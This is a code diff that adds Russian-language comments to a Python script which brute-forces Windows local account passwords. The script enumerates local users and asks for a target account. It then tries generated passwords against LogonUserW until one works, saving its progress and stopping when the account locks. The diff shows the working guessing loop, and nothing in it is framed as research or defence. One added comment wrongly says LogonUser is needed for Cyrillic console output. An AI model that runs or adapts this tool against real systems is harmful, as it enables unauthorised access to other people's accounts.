@@ -22,6 +22,7 @@ print(f"Автор: separeit894\n"
 
 users_list = list_users()
 
+# Эта функция потребуется для того, чтобы консоль могла работать с кирилицей
 LogonUser = ctypes.windll.advapi32.LogonUserW
 LogonUser.argtypes = (
     wintypes.LPCWSTR,  # Имя пользователя
@@ -58,9 +59,11 @@ else:
     # Указываем имя пользователя и пароль
     while True:
         account = str(input("Введите имя учетной записи: "))
+        # Проверяет есть ли учетная запись, которую ввел пользователь в списке
         if account in users_list:
             print("Учетная запись найдена")
             break
+        # Если её нет, то пользователь должен уже ввести корректную учетную запись
         else:
             print("Учетная запись не найдена!\n Введите имя учетной записи еще раз")
 
@@ -74,14 +77,15 @@ else:
         else:
             break
 
-username = account  # Замените на ваше имя пользователя
+username = account  
 
 
 found = False
-# time_start = int(time.time())
-# questions = input("Вы хотите видеть все попытки? (y/n): ").strip().lower()
+
 try:
+    # Цикл будет работать, пока не найдет подходящий пароль
     while not found:
+        # Циклом создаем новые пароли, characters это тот список символов, которые вы выбрали в начале
         for password in itertools.product(characters, repeat=i):
             password = "".join(password)
             if not password in tryed:
@@ -97,7 +101,7 @@ try:
                 ctypes.byref(token)
                 )
 
-
+                # Если в файле progress.json, параметр print_try ( y )
                 if print_try == "y":
                     if result:
                         print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
@@ -110,15 +114,23 @@ try:
                         if win32api.GetLastError() == 1909:
                             print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
                             input("Нажмите на Enter........ ")
+                            # Завершает работу
                             sys.exit()
 
+                # Если в файле progress.json, параметр print_try ( n )
                 else:
+                    # Выводит в случае, если получилось войти в учетную запись
                     if result:
                         print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                         found = True
                         input("Нажмите на Enter........ ")
                         break
                     else:
+                        """
+                        Будет выводить попытки раз в 250 попыток
+                        Управлять этим параметром можно в файле progress.json
+                        Параметр print_try (y/n)
+                        """
                         if try_id % 250 == 0:
                             print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                         tryed.append(password)
@@ -134,15 +146,14 @@ try:
         # Увеличиваем длину пароля, если не нашли подходящий
         if not found:
             i += 1
-
+# Если пользователь хочет прервать процесс
 except KeyboardInterrupt:
     save_progress(account, characters, i, try_id, tryed)
     print("Программа прервана. Прогресс сохранен.")
     input("Нажмите на Enter........ ")
 
+# Если произошла ошибка
 except Exception as ex:
     print("Произошла ошибка: ", ex)
     input("Нажмите на Enter........ ")
 
-# time_finish = int(time.time() - time_start)
-# print(f"{time_finish} секунд(ы)")
